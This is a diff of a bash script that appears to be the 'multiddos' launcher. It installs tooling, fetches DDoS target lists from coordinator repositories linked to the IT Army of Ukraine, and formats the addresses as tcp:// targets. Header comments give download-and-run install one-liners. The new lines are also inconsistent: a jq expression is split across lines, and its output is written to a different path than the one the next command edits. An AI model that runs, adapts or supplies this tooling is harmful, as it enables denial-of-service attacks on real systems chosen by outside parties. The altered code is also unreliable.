@@ -1,7 +1,7 @@
 #!/bin/bash
 # curl -LO tiny.one/multiddos && bash multiddos
 # curl -O https://raw.githubusercontent.com/KarboDuck/multiddos/main/md2.sh && bash md2.sh
-clear && echo -e "Loading... v1.1c\n"
+clear && echo -e "Loading... v1.1d\n"
 sudo apt-get update -q -y #>/dev/null 2>&1
 sudo apt-get install -q -y tmux jq git toilet python3 python3-pip 
 pip install --upgrade pip >/dev/null 2>&1
@@ -37,11 +37,12 @@ rm -rf ~/multidd/targets/*
 echo "$(curl -s https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/all.txt)" > ~/multidd/targets/source1.txt
 # 2 IT ARMY of Ukraine                             https://t.me/itarmyofukraine2022
 echo "$(curl -s -X GET "https://raw.githubusercontent.com/db1000n-coordinators/LoadTestConfig/main/config.v0.7.json" 2>/dev/null | jq -r '.jobs[].args.request.path')" > ~/multidd/targets/source2.txt
-echo "$(curl -s -X GET "https://raw.githubusercontent.com/db1000n-coordinators/LoadTestConfig/main/config.v0.7.json" 2>/dev/null | jq -r '.jobs[].args.client.static_host.addr | select (. != null)')" > ~/multidd/targets/source3.txt
-# echo "$(curl -s -X GET "https://raw.githubusercontent.com/db1000n-coordinators/LoadTestConfig/main/config.v0.7.json" 2>/dev/null | jq -r '.jobs[].args.connection.static_host.addr | select (. != null)')" > ~/multidd/targets/source3.txt
+
+echo "$(curl -s -X GET "https://raw.githubusercontent.com/db1000n-coordinators/LoadTestConfig/main/config.v0.7.json" 2>/dev/null | jq -r '.jobs[].args.connection.args.address | select (. != null
+)')" > source3.txt
 
 # remove all empty lines (only spaces, only tabs, only new lines)
-sed -i '/^[[:space:]]*$/d' ttt* ~/multidd/targets/source3.txt
+sed -i '/^[[:space:]]*$/d' ~/multidd/targets/source*.txt
 # add 'tcp://' to all ip addresses
 sed -i -e 's/^/tcp:\/\//g' ~/multidd/targets/source3.txt
 
